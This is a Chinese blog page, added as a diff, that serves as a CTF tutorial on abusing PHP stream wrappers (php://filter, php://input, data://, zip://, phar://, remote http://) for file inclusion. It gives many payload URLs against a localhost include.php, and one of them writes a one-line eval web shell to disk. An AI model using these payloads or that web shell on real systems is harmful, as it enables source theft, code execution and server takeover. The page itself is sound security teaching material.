@@ -1,0 +1,356 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8" />
+        <title>伪协议 | Whispering Words</title>
+        <meta name="author" content="花下醉" />
+        <meta name="description" content="此心安处" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+        <link rel="icon" href="/images/ee5300e0743945b8b3b6b87aaba69478.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.47/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.3.0/css/all.min.css" />
+<link rel="stylesheet" href="/css/fonts.min.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/xcode.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.org/KaTeX/0.16.4/katex.min.js"></script>
+<script src="https://cdn.staticfile.org/KaTeX/0.16.4/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/KaTeX/0.16.4/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+        <canvas
+    id="background"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"
+></canvas>
+<script src="/js/background.min.js"></script>
+<div id="cursor"></div>
+<link rel="stylesheet" href="/css/cursor.min.css" />
+<script src="/js/cursor.min.js"></script>
+
+
+    <meta name="generator" content="Hexo 5.4.2"></head>
+    <body>
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <nav id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <div class="desktop-menu">
+        <a class="title" href="/">
+            <span>WHISPERING WORDS</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;首页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;归档</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;类别</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" @click="shouMenuItems = !shouMenuItems" v-show="shouMenuItems"></div>
+        <div class="title" @click="shouMenuItems = !shouMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHISPERING WORDS</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="shouMenuItems">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">首页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">归档</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">类别</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <div class="article">
+    <div>
+        <h1>伪协议</h1>
+    </div>
+    <div id="toc-container">
+        <!-- toc -->
+      </div>
+      
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/5/12
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                网络安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/web/" style="color: #ff7d73">web</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-x2F-x2F-%E5%8D%8F%E8%AE%AE"><span class="toc-text">file:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-x2F-x2F-%E5%8D%8F%E8%AE%AE"><span class="toc-text">php:&#x2F;&#x2F; 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-x2F-x2F-filter%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-text">php:&#x2F;&#x2F;filter参数详解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-%E5%8D%8F%E8%AE%AE"><span class="toc-text">zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-x2F-x2F-%E5%8D%8F%E8%AE%AE"><span class="toc-text">data:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-%E5%92%8Chttps-%E5%8D%8F%E8%AE%AE"><span class="toc-text">http:&#x2F;&#x2F;和https:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-x2F-x2F-%E5%8D%8F%E8%AE%AE"><span class="toc-text">phar:&#x2F;&#x2F; 协议</span></a></li></ol>
+    </div>
+    
+        <h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F; 协议"></a>file:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：<br>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen与allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。<br>说明：<br>file:&#x2F;&#x2F; 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()，include_path</code> 会可选地搜索，也作为相对的路径。<br>用法：</p>
+<pre><code class="bash">/path/to/file.ext
+relative/path/to/file.ext
+fileInCwd.ext
+C:/path/to/winfile.ext
+C:\path\to\winfile.ext
+\\smbserver\share\path\to\winfile.ext
+file:///path/to/file.ext
+</code></pre>
+<p>示例：</p>
+<ul>
+<li>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</li>
+</ul>
+<p><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p>
+<ul>
+<li>[文件的相对路径和文件名]</li>
+</ul>
+<p><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></p>
+<ul>
+<li>[http：&#x2F;&#x2F;网络路径和文件名]<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></li>
+</ul>
+<h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F; 协议"></a>php:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :仅php://input php://stdin php://memory</code><br><code>php://temp 需要on</code><br>作用：<br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。<br>说明：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<p>作用</p>
+<pre><code class="bash">php://input:可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。
+php://output:只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。
+php://fd:(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。
+php://memory php://temp(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。
+php://filter:(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
+</code></pre>
+<h4 id="php-x2F-x2F-filter参数详解"><a href="#php-x2F-x2F-filter参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter参数详解"></a>php:&#x2F;&#x2F;filter参数详解</h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：<br>php:&#x2F;&#x2F;filter 参数描述</p>
+<ul>
+<li>resource&#x3D;&lt;要过滤的数据流&gt;必须项。它指定了你要筛选过滤的数据流。</li>
+<li>read&#x3D;&lt;读链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（<em>\ </em>）分隔。</li>
+<li>write&#x3D;&lt;写链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</li>
+<li>&lt;; 两个链的过滤器&gt;任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</li>
+</ul>
+<p>可用的过滤器列表（4类）</p>
+<ul>
+<li>字符串过滤器<br>string.rot13 等同于str_rot13()，rot13变换<br>string.toupper 等同于strtoupper()，转大写字母<br>string.tolower 等同于strtolower()，转小写字母<br>string.strip_tags 等同于strip_tags()，去除html、PHP语言标签</li>
+<li>转换过滤器<br>convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码<br>convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码</li>
+<li>压缩过滤器<br>zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。<br>bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。</li>
+<li>加密过滤器<br>mcrypt.<em>libmcrypt 对称加密算法<br>mdecrypt.</em> libmcrypt 对称解密算法<br>示例：</li>
+</ul>
+<p><code>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</code></p>
+<p><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></p>
+<p><code>php://input + [POST DATA]执行php代码</code></p>
+<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php phpinfo(); ?&gt;
+图片描述
+</code></pre>
+<p>若有写入权限，写入一句话木马</p>
+<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;
+</code></pre>
+<h3 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。<br>示例：</p>
+<p>zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
+<p><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></p>
+<p><code>compress.bzip2://file.bz2</code></p>
+<p>压缩 <code>phpinfo.txt</code> 为<code>phpinfo.bz2</code>并上传（同样支持任意后缀名）</p>
+<p><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></p>
+<p><code>compress.zlib://file.gz</code></p>
+<p>压缩<code>phpinfo.txt</code>为<code> phpinfo.gz</code> 并上传（同样支持任意后缀名）</p>
+<p><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></p>
+<h3 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F; 协议"></a>data:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。<br>用法：</p>
+<p><code>data://text/plain,</code><br><code>data://text/plain;base64,</code><br>示例：</p>
+<pre><code class="bash">data://text/plain,
+
+http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
+
+or
+
+data://text/plain;base64,
+
+http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<h3 id="http-和https-协议"><a href="#http-和https-协议" class="headerlink" title="http://和https://协议"></a><code>http://</code>和<code>https://</code>协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。<br>用法：</p>
+<pre><code class="bash">http://example.com
+http://example.com/file.php?var1=val1&amp;var2=val2
+http://user:password@example.com
+https://example.com
+https://example.com/file.php?var1=val1&amp;var2=val2
+https://user:password@example.com
+</code></pre>
+<p>示例：<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></p>
+<h3 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F; 协议"></a>phar:&#x2F;&#x2F; 协议</h3><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
+<p><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+                <footer id="footer">
+    <div id="footer-wrap">
+        <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+<div id="poem_sentence"></div>
+<div id="poem_info"></div>
+<script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+    sentence.innerHTML = result.data.content
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
+  });</script>
+        <div>
+            &copy;
+            2023 - 2023 Whispering Words
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;花下醉
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/js/main.js"></script>
+        
+        
+
+
+
+
+        
+        
+    </body>
+</html>
